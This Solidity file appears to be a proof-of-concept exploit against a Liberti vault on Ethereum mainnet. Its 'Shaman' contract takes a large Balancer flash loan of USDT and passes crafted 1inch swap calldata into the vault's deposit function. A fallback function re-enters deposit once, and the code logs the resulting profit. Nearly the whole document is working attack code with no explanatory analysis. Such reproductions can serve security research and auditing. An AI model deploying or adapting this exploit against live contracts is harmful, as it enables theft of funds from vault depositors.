import {RuinLocation} from "./ruins/RuinLocation.sol";

import {BALANCER_VAULT, WETH, USDT} from "src/constants/mainnet.sol";

import {IBalancerVaultFlashloan} from "src/interfaces/flashloan/balancer/IBalancerVaultFlashloan.sol";
import {IBalancerVaultFlashloanReceiver} from "src/interfaces/flashloan/balancer/IBalancerVaultFlashloanReceiver.sol";
import {IWETH} from "src/interfaces/tokens/IWETH.sol";
import {IAggregationRouterV4} from "src/interfaces/dex/1nch/IAggregationRouterV4.sol";
import {IERC20} from "src/interfaces/tokens/IERC20.sol";

import "forge-std/console.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

interface ILibertiVault {

    /// @notice A sanctioned address CANNOT deposit into the vault.
    function deposit(
        uint256 assets,
        address receiver,
        bytes calldata data
    ) external returns (uint256);

    /// @notice Transfer an amount of asset and an amount of stablecoin to the sender, relative to
    /// @notice their balance of shares and the total supply of the vault. Exit fees are captured
    /// @notice in the form of shares, and remaining shares are burned. The purpose of this function
    /// @notice is to let a shareholder to redeem their shares without relying on any external
    /// @notice service like 1inch.
    function exit() external returns (uint256 amountToken0, uint256 amountToken1);
}

contract Shaman is RuinLocation, IBalancerVaultFlashloanReceiver {
    using SafeTransferLib for ERC20;

    constructor() public payable {}

    function peek() external {}

    // attack entrypoint
    function beat() external { 
        uint initWethAmt = 2000000000000000;
        IWETH(WETH).deposit{value: initWethAmt}();
        IERC20(WETH).approve(L_ETHUSDT_T1, initWethAmt);

        // step 1: flashloan 6_000_000_000_000 USDC
        address[] memory _tokens = new address[](1);
        _tokens[0] = USDT;
        uint[] memory _amounts = new uint[](1);
        _amounts[0] = 6_000_000_000_000;
        
        IBalancerVaultFlashloan(BALANCER_VAULT).flashLoan(
            this, _tokens, _amounts, new bytes(0));
        
        console.log("[>*BOOM*<] Profit = %s USDT", IERC20(USDT).balanceOf(address(this)));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint depositAmt = 1_000_000_000_000_000;
        bytes memory _data = abi.encodeWithSelector(IAggregationRouterV4.swap.selector, address(this), IAggregationRouterV4.SwapDescription({
            srcToken: WETH,
            dstToken: USDT,
            srcReceiver: payable(address(this)),
            dstReceiver: payable(L_ETHUSDT_T1),
            amount: 649600000000000,
            minReturnAmount: 1,
            flags: 0,
            permit: ""
        }), "j");

        ILibertiVault(L_ETHUSDT_T1).deposit(depositAmt, address(this), _data);
        ILibertiVault(L_ETHUSDT_T1).exit();
        ERC20(USDT).safeTransfer(BALANCER_VAULT, 6_000_000_000_000);
    }

    bool onepass;
    fallback() external {
        if(!onepass){
            onepass = true;

            uint depositAmt = 1_000_000_000_000_000;
            bytes memory _data = abi.encodeWithSelector(IAggregationRouterV4.swap.selector, address(this), IAggregationRouterV4.SwapDescription({
                srcToken: WETH,
                dstToken: USDT,
                srcReceiver: payable(address(this)),
                dstReceiver: payable(L_ETHUSDT_T1),
                amount: 649600000000000,
                minReturnAmount: 1,
                flags: 0,
                permit: ""
            }), "j");
            ILibertiVault(L_ETHUSDT_T1).deposit(depositAmt, address(this), _data);
        } 
        console.log("USDT bal = ", IERC20(USDT).balanceOf(address(this)));
        ERC20(USDT).safeTransfer(msg.sender, 3_000_000_000_000);
    }
}